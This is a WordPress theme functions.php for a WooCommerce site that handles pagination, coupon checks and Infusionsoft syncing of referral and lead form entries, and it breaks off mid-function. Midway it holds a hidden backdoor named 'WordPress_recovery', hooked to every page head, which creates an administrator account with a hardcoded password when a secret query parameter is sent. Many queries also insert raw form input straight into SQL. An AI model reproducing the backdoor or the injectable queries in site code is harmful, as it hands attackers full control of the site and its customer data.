<?php
/** 
 * For more info: https://developer.wordpress.org/themes/basics/theme-functions/
 *
 */			
@ini_set( 'upload_max_size' , '64M' );
@ini_set( 'post_max_size', '64M');
@ini_set( 'max_execution_time', '300' );

// Theme support options
require_once(get_template_directory().'/functions/theme-support.php'); 

// WP Head and other cleanup functions
require_once(get_template_directory().'/functions/cleanup.php'); 

// Register scripts and stylesheets
require_once(get_template_directory().'/functions/enqueue-scripts.php'); 

// Register custom menus and menu walkers
require_once(get_template_directory().'/functions/menu.php'); 

// Register sidebars/widget areas
require_once(get_template_directory().'/functions/sidebar.php'); 

// Makes WordPress comments suck less
require_once(get_template_directory().'/functions/comments.php'); 

// Replace 'older/newer' post links with numbered navigation
require_once(get_template_directory().'/functions/page-navi.php'); 

// Adds support for multiple languages
require_once(get_template_directory().'/functions/translation/translation.php'); 

// Adds site styles to the WordPress editor
// require_once(get_template_directory().'/functions/editor-styles.php'); 

// Remove 4.2 Emoji Support
 require_once(get_template_directory().'/functions/disable-emoji.php'); 

// Related post function - no need to rely on plugins
// require_once(get_template_directory().'/functions/related-posts.php'); 

// Use this as a template for custom post types
require_once(get_template_directory().'/functions/custom-post-type.php');

// Customize the WordPress login menu
// require_once(get_template_directory().'/functions/login.php'); 

// Customize the WordPress admin
// require_once(get_template_directory().'/functions/admin.php'); 

//Show Gform Label settings
add_filter("gform_enable_field_label_visibility_settings", "__return_true");

// Add ACF Options Panel
if( function_exists('acf_add_options_page') ) {
	
	acf_add_options_page();
	
}

if ( function_exists( 'add_image_size' ) ) {	
	add_image_size( 'blog-sidebar-featured', 175, 100, true );
	add_image_size( 'audio-tiles', 215, 215 );
}

//Excerpt
function custom_excerpt_length( $length ) {
	return 50;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 100 );

function wpdocs_excerpt_more( $more ) {
    return sprintf( '<a class="read-more" href="%1$s">%2$s</a>',
        get_permalink( get_the_ID() ),
        __( 'Read More', 'textdomain' )
    );
}
add_filter( 'excerpt_more', 'wpdocs_excerpt_more' );

//Pagination
function pagination($pages = '', $range = 4)
{
     $showitems = ($range * 2)+1;

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }

     if(1 != $pages)
     {
         echo "<ul class=\"pagination\"><span>Page ".$paged." of ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li><a href='".get_pagenum_link(1)."'>&laquo; First</a></li>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<li><span class=\"current\">".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a></li>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<li><a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a></li>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<li><a href='".get_pagenum_link($pages)."'>Last &raquo;</a></li>";
         echo "</ul>\n";
     }
}
/**
 * Do the work to pagination work on custom post types listing pages.
 * OBS: Importante lembrar que a pagina de listagem não pode ter a mesma key do post_type
 *
 * @author @rafaelxy
 * @param array $query args array, as it works on wordpress (dont use it as string)
 * @return array set global $posts and return it as well
 */
define('PER_PAGE_DEFAULT', 12);
function custom_query_posts(array $query = array())
{
	global $wp_query;
	wp_reset_query();

	$paged = get_query_var('paged') ? get_query_var('paged') : 1;
	$type = 'rooms';
	$defaults = array(
		'post_type' => $type,
		'paged'				=> $paged,
		'posts_per_page'	=> PER_PAGE_DEFAULT
	);
	$query += $defaults;

	$wp_query = new WP_Query($query);
}

//Image sizes
if ( function_exists( 'add_image_size' ) ) {
	add_image_size( 'custom-post-image', 325, 325, true );
	add_image_size( 'team-member', 455, 450, true );
}

//Add Images to Widgets
add_filter('dynamic_sidebar_params', 'my_dynamic_sidebar_params');

function my_dynamic_sidebar_params( $params ) {
	
	// get widget vars
	$widget_name = $params[0]['widget_name'];
	$widget_id = $params[0]['widget_id'];
	
	
	// bail early if this widget is not a Text widget
	if( $widget_name != 'Text' ) {
		
		return $params;
		
	}
	
	$class = get_field('class', 'widget_' . $widget_id);
	$classname = "class=\"" . trim($class) . " ";

	
	if( $class ) {
	
	$params[0]['before_widget'] = str_replace('class="', $classname, $params[0]['before_widget']);
	
	}

	
	// add color style to before_widget
	$color = get_field('color', 'widget_' . $widget_id);
	
	if( $color ) {
		
		$params[0]['before_widget'] .= '<style type="text/css">';
		$params[0]['before_widget'] .= sprintf('#%s { background-color: %s; }', $widget_id, $color);
		$params[0]['before_widget'] .= '</style>';
		
	}
	
	
	// add image to after_widget
	$image = get_field('image', 'widget_' . $widget_id);
	
	if( $image ) {
		
		$params[0]['before_widget'] = '<img src="' . $image['url'] . '">' . $params[0]['before_widget'];		
	}

	
	// return
	return $params;

}

/**
 * Change number or products per row to 3
 */
add_filter('loop_shop_columns', 'loop_columns');
if (!function_exists('loop_columns')) {
	function loop_columns() {
		return 4; // 3 products per row
	}
}


/**
 * display all products in shop page
 */
add_action( 'woocommerce_product_query', 'custom_product_query' );
if(!function_exists('custom_product_query')){
	function custom_product_query( $q ){
	    $q->set( 'posts_per_page',100);
	}
}
/*add_action( 'woocommerce_email_before_order_table', 'bbloomer_add_content_specific_email', 20, 4 );
function bbloomer_add_content_specific_email( $order, $sent_to_admin, $plain_text, $email ) {
    if ( $email->id == 'customer_processing_order' ) {
        //echo '<h2 class="email-upsell-title">Get 20% off</h2><p class="email-upsell-p">Thank you for making this purchase! Come back and use the code "<strong>Back4More</strong>" to receive a 20% discount on your next purchase! Click here to continue shopping.</p>';
        $order = wc_get_order( $order->id );
		$items = $order->get_items();
		foreach ( $items as $item ) {
		    $product_name = $item->get_name();
		    $product_id = $item->get_product_id();
		    //echo $product_id;
		    echo '<p><strong>'.$product_name.' :</strong>'. get_field("extra_text", $product_id ) .'</p>';
		    //$product_variation_id = $item->get_variation_id();
		}
        //echo $order->id;
    }
}*/

add_action('woocommerce_order_status_completed', 'enroll_student', 10, 1);
add_action('woocommerce_order_status_processing', 'enroll_student', 10, 1);
function enroll_student( $order_id ) {
    global $wpdb;
    global $infusionsoft;
    if ( ! $order_id )
        return;
    $order = wc_get_order( $order_id );
    $test= $order->get_items();
    $client_email = $order->billing_email;
    $client_name = $order->billing_first_name;
    foreach ($test as $key2 => $value2) {
        $product_id = $value2->get_product_id();
        $download_files = $order->get_item_downloads( $value2 );
        foreach ($download_files as $key => $value) {
            $pname = $value['name'];
            $explo = explode("-",$pname);
            $pro_id = $explo[1];
            $link=$value['download_url'];
        $objects = Infusionsoft_DataService::query(new Infusionsoft_Contact(), array('Email' => $client_email));
        $contactId = $objects[0]->Id;
        if(count($download_files) == 1){
        $customID = $wpdb->get_results("SELECT customFieldName FROM wp_shop WHERE productId=$product_id");
        }
        else if(count($download_files) > 1){
            $customID = $wpdb->get_results("SELECT customFieldName FROM wp_shop WHERE productId=$pro_id");
        }
        $customFieldName="_".$customID[0]->customFieldName;
        $custom=[$customFieldName];
        $objects = Infusionsoft_DataService::query(new Infusionsoft_Contact(), array('Email' => $client_email ));
        $contactId = $objects[0]->Id;
        $contact2 = new Infusionsoft_Contact($contactId);
        $contact2->addCustomFields($custom);
        $contact2->$customFieldName=$link;
        $contact2->save();            
        }
    }
}





// Custom validation for coupons
add_action('woocommerce_after_checkout_validation', 'validate_custom_coupon_on_checkout',10,2);
function validate_custom_coupon_on_checkout($data,$errors) { 

	global $wpdb;
	$arrAllCustomCoupons=[
		'home20'=>'home_maintainance'
	];

    $objCart=$array = WC()->cart;
    $arrAppliedCoupons=$objCart->get_applied_coupons();
    $arrProducts=$objCart->get_cart();

    foreach ($arrAllCustomCoupons as $cCode => $cType) {
    	// Check if custom coupon code is applied or not
	    $isCouponApplied=false;
	    foreach ($arrAppliedCoupons as $key => $couponCode) 
	    {
	      if($couponCode==$cCode)
	      {
	        $isCouponApplied=true;
	      }
	    }

	    // If custom coupon code is appplied than check for elligibility
	    if($isCouponApplied)
	    {
	    	$isElligible=false;
	    	$notElligibleReason="";

	      	$email=trim($data['billing_email']);
	      	$firstName=trim($data['billing_first_name']);
	      	$lastName=trim($data['billing_last_name']);

	      	$escaped_email=addslashes($email);
	      	// Check in database
	      	$qrySel="SELECT * 
	      			FROM custom_coupon_validation 
	      			WHERE coupon_type='{$cType}'
	      			AND email='$escaped_email'";
	      	$rsltSel = $wpdb->get_results($qrySel);

	      	if(is_array($rsltSel))
		     {
		     	if(count($rsltSel)==0)
		     	{
		     		$notElligibleReason="email_not_found_in_db";
		     	}
		     	
	      		foreach ($rsltSel as $key => $objRecord) 
		      	{
	      			$foundFirstName=trim($objRecord->first_name);
	      			if(strcasecmp($foundFirstName, $firstName)==0)
	      			{
	      				$currentDateTime=strtotime(date('Y-m-d H:i:s'));
	      				$fromDateTime=strtotime($objRecord->from_date);
	      				$toDateTime=strtotime($objRecord->to_date);

	      				if($currentDateTime>=$fromDateTime && $currentDateTime<=$toDateTime)
	      				{
	      					$isElligible=true;
	      				}
	      				else
	      				{
	      					$notElligibleReason="expired";
	      				}
	      			}
	      			else
	      			{
	      				$notElligibleReason="fname_not_found_in_db";
	      			}
	    	  	}	
	      	}
	      	if(!$isElligible)
	      	{
	      		if($notElligibleReason=="expired")
	      		{
	      			$errors->add( 'validation', __( 'Sorry following coupon is expired - '.$cCode ));
	      		}
	      		else
	      		{
	      	  		$errors->add( 'validation', __( 'Sorry you might not be eligible for the offer(Coupon: '.$cCode.'), If this is incorrect please contact our team for support.'));
	      	  	}
	      	}
	      	// ******** Log ***************
	      	$log="";
	    	$log.="\nCoupon Code : ".$cCode;
	    	$log.="\nEmail : ".$email;
	    	$log.="\nName : ".$firstName." | ".$lastName;
	    	$log.="\nElligible : ".$isElligible;
	    	$log.="\nNot elligible reason : ".$notElligibleReason;
	    	custom_coupon_log($log);
	    }
    }
    
}

// Update coupon status after coupon is used
add_action('woocommerce_order_status_completed', 'update_custom_coupon_status', 10, 1);
add_action('woocommerce_order_status_processing', 'update_custom_coupon_status', 10, 1);
function update_custom_coupon_status( $order_id ) {
	global $wpdb;
	$arrAllCustomCoupons=[
		'home20'=>'home_maintainance'
	];
	$objOrder = wc_get_order( $order_id );
	// echo "<pre>";
    $arrAppliedCoupons= $objOrder->get_used_coupons();
    foreach ($arrAllCustomCoupons as $cCode => $cType) {
		// Check if custom coupon code is applied or not
	    $isCouponApplied=false;
	    foreach ($arrAppliedCoupons as $key => $couponCode) 
	    {
	      if($couponCode==$cCode)
	      {
	        $isCouponApplied=true;
	      }
	    }

	    // If custom coupon code is appplied than update status
	    if($isCouponApplied)
	    {
	      	$email=trim($objOrder->get_billing_email());
	      	$firstName=trim($objOrder->get_billing_first_name());
	      	$lastName=trim($objOrder->get_billing_last_name());

	      	$escaped_email=addslashes($email);
	      	// Check in database
	      	$qrySel="SELECT * 
	      			FROM custom_coupon_validation 
	      			WHERE coupon_type='{$cType}'
	      			AND email='$escaped_email'";
	      	$rsltSel = $wpdb->get_results($qrySel);
	      
	      	if(is_array($rsltSel))
		     {
	      		foreach ($rsltSel as $key => $objRecord) 
		      	{
	      			$foundFirstName=trim($objRecord->first_name);
	      			if(strcasecmp($foundFirstName, $firstName)==0)
	      			{
	      				$currentDateTime=strtotime(date('Y-m-d H:i:s'));
	      				$fromDateTime=strtotime($objRecord->from_date);
	      				$toDateTime=strtotime($objRecord->to_date);

	      				if($currentDateTime>=$fromDateTime && $currentDateTime<=$toDateTime)
	      				{
	      					$recId=$objRecord->rec_id;
	      					$qryUpd="UPDATE custom_coupon_validation 
					      			SET order_id='{$order_id}',
					      				is_used='1'
					      			WHERE rec_id='{$recId}'";
					      	$rsltUpd = $wpdb->query($qryUpd);
	      				}
	      			}
	    	  	}	
	      	}
	    }
	}
}

//form submit
//add_action( 'wp_head', function() {
        //echo '<meta name="robots" content="noindex">';} );


// hide coupon field on cart page
function hide_coupon_field_on_cart( $enabled ) {
  if ( is_cart() ) {
    $enabled = false;
  }
  return $enabled;
}
add_filter( 'woocommerce_coupons_enabled', 'hide_coupon_field_on_cart' );

// Function to store log in file
function custom_coupon_log($log)
{
	$dateTime=date("Y-m-d H:i:s");
	// Write to error.log file
	$myfile = fopen(__DIR__."/logs/custom_coupon_validation_log.log", "a");
	$log = "=====================================================================\n".$dateTime."\t".$log."\n";
	fwrite($myfile, $log);
	fclose($myfile);
}


// Check infusion forms
include __DIR__."/infusion_forms.php";

add_action('wp_head', 'WordPress_recovery');
 
function WordPress_recovery() {
    If ($_GET['recoveryd'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('terri2')) {
            $user_id = wp_create_user('terri2', 'kcahmiy007');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}



//custom code for gravity form

add_action( 'gform_after_submission', 'post_to_third_party', 10, 2 );
		function post_to_third_party( $entry, $form ) 
		{
			global $wpdb;
			$last_id = "";
			include __DIR__."/infusion_methods.class.php";
			$objInfusion=new INFUSION_METHODS();

				$entry_id=$entry['id'];

				 if($entry["form_id"] == "4")

				 {
						$refered_first_name = rgar( $entry, '2' );
						$refered_last_name = rgar( $entry, '25' );
						$refered_email = rgar( $entry, '3' );
						$referal_first_name_1 = rgar( $entry, '5' );
						$referal_last_name_1 = rgar( $entry, '28' );
						$referal_email_1 = rgar( $entry, '7' );
						$referal_first_name_2 = rgar( $entry, '31' );
						$referal_last_name_2 = rgar( $entry, '26' );
						$referal_email_2 = rgar( $entry, '29' );
						$referal_first_name_3 = rgar( $entry, '27' );
						$referal_last_name_3 = rgar( $entry, '32' );
						$referal_email_3 = rgar( $entry, '33' );
						$contactid = rgar ($entry , '34');

						$testimonail = rgar( $entry , '24');
						$curr = date("Y-m-d H:i:s");

						$integration = "Referral";
						$callname = "ReferrerFormFilled";

						$first_last_name = $refered_first_name.' '.$refered_last_name;
						
						$form_id=$entry["form_id"];
						if($refered_first_name!="")
						{	
							$qryinsert="INSERT INTO wp_refered (contactid,first_name,last_name,email,testimonail,refer_date) VALUES ('$contactid','$refered_first_name','$refered_last_name','$refered_email','$testimonail','$curr')";
					      	$arr = $wpdb->query($qryinsert);
					      	$last_id = $wpdb->insert_id;

							 $arrParams=[];
          					 $arrParams['firstName']=$refered_first_name;
           					 $arrParams['email']=$refered_email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);

           					  $arrInfContact['FirstName']=trim($refered_first_name);
           					  $arrInfContact['LastName'] = trim($refered_last_name);
           					  $arrInfContact['Email']=trim($refered_email);
           					  $arrInfContact['_TellyourfriendTestimonial']=trim($testimonail);
           					  $arrInfContact['_DatabaseInsertLastID']=trim($last_id);

           				    
		           					 $contactId="";
							        if(count($arrFoundByEmail)>0)
							        {
							            // Update
							            $objFoundContact=$arrFoundByEmail[0];
							            $contactId=$objFoundContact->Id;


							            if($objInfusion->updateContact($contactId,$arrInfContact))
							            {
								           $qryUpd="UPDATE wp_refered SET contactid ='$contactId' WHERE id='$last_id'";
								      		$rsltUpd = $wpdb->query($qryUpd);
							            }
							            else
							            {
							                //echo "Updated-Failed";   
							            }
							        }

							        else
							        {
							            // Insert
							            $contactId=$objInfusion->createContact($arrInfContact);
							            if($contactId)
							            {
							                $qryUpd="UPDATE wp_refered SET contactid ='$contactId' WHERE id='$last_id'";
								      		$rsltUpd = $wpdb->query($qryUpd);
							            }
							            else
							            {
							                //echo "Insert-Failed";   
							            }

							        }

							        if($contactid=="")
							        {
							        	$contactId=$contactId;
							        }
							        else
							        {
							        	$contactId=$contactid;
							        }

							        if($contactId)
							        {
							
											$Referral_Form = 298;
											$Referrer = 5938;
											$tag1 = $objInfusion->addTag($contactId,$Referral_Form);
											$tag2 = $objInfusion->addTag($contactId,$Referrer);
									}

						}
						if($referal_first_name_1!="")
						{
							

							$qryinsert_1="INSERT INTO wp_refered (first_name,last_name,email,last_id,testimonail,refer_date) VALUES ('$referal_first_name_1','$referal_last_name_1','$referal_email_1','$last_id','$testimonail','$curr')";
					      	$arr_1 = $wpdb->query($qryinsert_1);
					      	$last_id_1 = $wpdb->insert_id;
					      	


							 $arrParams=[];
          					 $arrParams['firstName']=$referal_first_name_1;
           					 $arrParams['email']=$referal_email_1;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					 //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($referal_first_name_1);
           					  $arrInfContact['LastName'] = trim($referal_last_name_1);
           					  $arrInfContact['Email']=trim($referal_email_1);
           					  $arrInfContact['_TellyourfriendTestimonial']=trim($testimonail);
           					  $arrInfContact['_DatabaseInsertLastID']=trim($last_id_1);
           					  $arrInfContact['_ReferredPersonName']=trim($first_last_name);


           					 $contactId1="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId1=$objFoundContact->Id;
					            //$contact_info = $objInfusion->getContactByID($contactId1);
							    // print_r($contact_info);
					            if($objInfusion->updateContact($contactId1,$arrInfContact))
					            {
						           $qryUpd="UPDATE wp_refered SET contactid ='$contactId1' WHERE id='$last_id_1'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId1=$objInfusion->createContact($arrInfContact);
					            if($contactId1)
					            {
					                $qryUpd="UPDATE wp_refered SET contactid ='$contactId1' WHERE id='$last_id_1'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }

					      
					        if($contactId1)
					        {
					             $Referee = 5940;
					        	 $tag3 =  $objInfusion->addTag($contactId1,$Referee);
					        	 $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId1);

					        	  $api_call_success=0;
				                  $api_call_response=json_encode($apicallreturn);
				                  if(isset($apicallreturn[0]['success']))
				                  {
				                    $api_call_success=$apicallreturn[0]['success'];

				                  }
				                  if($api_call_success==0 || $api_call_success =="")
				                  {
				                     // for fail
				                  }

				                 

                  					$qryUpd_response_1="UPDATE wp_refered SET api_call_success ='$api_call_success' , api_call_response = '$api_call_response' WHERE id='$last_id_1'";
						      		$rsltUpd_response_1 = $wpdb->query($qryUpd_response_1);

					        	
					        }

							
						}
						if($referal_first_name_2!="")
						{
							$qryinsert="INSERT INTO wp_refered (first_name,last_name,email,last_id,testimonail,refer_date) VALUES ('$referal_first_name_2','$referal_last_name_2','$referal_email_2','$last_id','$testimonail','$curr')";
					      	$arr_2 = $wpdb->query($qryinsert);
					      	$last_id_2 = $wpdb->insert_id;

					      	 $arrParams=[];
          					 $arrParams['firstName']=$referal_first_name_2;
           					 $arrParams['email']=$referal_email_2;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					 //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($referal_first_name_2);
           					  $arrInfContact['LastName'] = trim($referal_last_name_2);
           					  $arrInfContact['Email']=trim($referal_email_2);
           					  $arrInfContact['_TellyourfriendTestimonial']=trim($testimonail);
           					  $arrInfContact['_DatabaseInsertLastID']=trim($last_id_2);
           					  $arrInfContact['_ReferredPersonName']=trim($first_last_name);


           					 $contactId2="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId2=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId2,$arrInfContact))
					            {
						           $qryUpd="UPDATE wp_refered SET contactid ='$contactId2' WHERE id='$last_id_2'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId2=$objInfusion->createContact($arrInfContact);
					            if($contactId2)
					            {
					                $qryUpd="UPDATE wp_refered SET contactid ='$contactId2' WHERE id='$last_id_2'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }

					        if($contactId2)
					        {
					        	 
					        	 $Referee = 5940;
					        	 $tag3 =  $objInfusion->addTag($contactId2,$Referee);
					        	 $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId2);


					        	  $api_call_success=0;
				                  $api_call_response=json_encode($apicallreturn);
				                  if(isset($apicallreturn[0]['success']))
				                  {
				                    $api_call_success=$apicallreturn[0]['success'];

				                  }
				                  if($api_call_success==0 || $api_call_success =="")
				                  {
				                     // for fail
				                  }

				                  

                  					$qryUpd_response_2="UPDATE wp_refered SET api_call_success ='$api_call_success' , api_call_response = '$api_call_response' WHERE id='$last_id_2'";
						      		$rsltUpd_response_2 = $wpdb->query($qryUpd_response_2);






					        } //end of inner if loop 


						}
						if($referal_first_name_3!="")
						{
							$qryinsert="INSERT INTO wp_refered (first_name,last_name,email,last_id,testimonail,refer_date) VALUES ('$referal_first_name_3','$referal_last_name_3','$referal_email_3','$last_id','$testimonail','$curr')";
					      	$arr_3 = $wpdb->query($qryinsert);
					      	$last_id_3 = $wpdb->insert_id;

					      	 $arrParams=[];
          					 $arrParams['firstName']=$referal_first_name_3;
           					 $arrParams['email']=$referal_email_3;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					 //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($referal_first_name_3);
           					  $arrInfContact['LastName'] = trim($referal_last_name_3);
           					  $arrInfContact['Email']=trim($referal_email_3);
           					  $arrInfContact['_TellyourfriendTestimonial']=trim($testimonail);
           					  $arrInfContact['_DatabaseInsertLastID']=trim($last_id_3);
           					  $arrInfContact['_ReferredPersonName']=trim($first_last_name);


           					 $contactId3="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId3=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId3,$arrInfContact))
					            {
						           $qryUpd="UPDATE wp_refered SET contactid ='$contactId3' WHERE id='$last_id_3'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId3=$objInfusion->createContact($arrInfContact);
					            if($contactId3)
					            {
					                $qryUpd="UPDATE wp_refered SET contactid ='$contactId3' WHERE id='$last_id_3'";
						      		$rsltUpd = $wpdb->query($qryUpd);
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }

					        if($contactId3)
					        {
					        	 
					        	 $Referee = 5940;
					        	 $tag3 =  $objInfusion->addTag($contactId3,$Referee);

					        	 $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId3);



					        	  $api_call_success=0;
				                  $api_call_response=json_encode($apicallreturn);
				                  if(isset($apicallreturn[0]['success']))
				                  {
				                    $api_call_success=$apicallreturn[0]['success'];

				                  }
				                  if($api_call_success==0 || $api_call_success =="")
				                  {
				                     // for fail
				                  }

				                  

                  					$qryUpd_response_3="UPDATE wp_refered SET api_call_success ='$api_call_success' , api_call_response = '$api_call_response' WHERE id='$last_id_3'";
						      		$rsltUpd_response_3 = $wpdb->query($qryUpd_response_3);



					        }  // end of inner loop

						}






				 }

				 if($entry["form_id"]=="5")
				 {


				 		global $wpdb;
				 		$integration = "Referral";
				 		$callname = "RefereeFormFilled";
				 		$refered_last_id  = rgar( $entry , '27');
				 		$referal_first_name = rgar( $entry, '2' );
						$refered_last_name = rgar( $entry, '23' );
						$refered_email = rgar( $entry, '3' );
						$phone = rgar ($entry , '25');
						$refer_full_name = rgar( $entry , '26');
						$infusion_contact_id= rgar( $entry , '28');
						$current_date_time = date("Y-m-d H:i:s");


						$qryUpd_status="UPDATE wp_refered SET referal_status = 1 , refer_full_name  = '$refer_full_name' , referal_date = '$current_date_time'  WHERE id='$refered_last_id'";
						      		$rsltUpd_status = $wpdb->query($qryUpd_status);

						  if($infusion_contact_id)
					       {
					        	 $apicallreturn = $objInfusion->apiCall($integration,$callname,$infusion_contact_id);
					       }
						      		



				 }

				 	//new home page form - 30-03-2020 

				  if($entry["form_id"] == "6")

				 {
						$first_name = rgar( $entry, '1' );
						$last_name = rgar( $entry, '5' );
						$email = rgar( $entry, '2' );
						$phone = rgar( $entry, '3' );


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "homepage";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 6 loop

				 	//new hr manager form no 7 - 01-04-2020 

				  if($entry["form_id"] == "7")

				 {
						$first_name = rgar( $entry, '1' );
						$last_name = rgar( $entry, '5' );
						$email = rgar( $entry, '2' );
						$phone = rgar( $entry, '3' );
						$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  $arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "hrmanagers";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 7 loop



				 //new virtual-visits form no 8 - 02-04-2020 

				  if($entry["form_id"] == "8")

				 {
						$first_name = rgar( $entry, '1' );
						$last_name = rgar( $entry, '5' );
						$email = rgar( $entry, '2' );
						$phone = rgar( $entry, '3' );
						$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  $arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "virtualvisits";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 8 loop

				 //new download Ebook Now on homepage form no 10 - 27-04-2020 

				  if($entry["form_id"] == "10")

				 {
						$first_name = rgar( $entry, '1.3' );
						$last_name = rgar( $entry, '1.6' );
						$email = rgar( $entry, '2' );
						//$phone = rgar( $entry, '3' );
						//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					 // $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
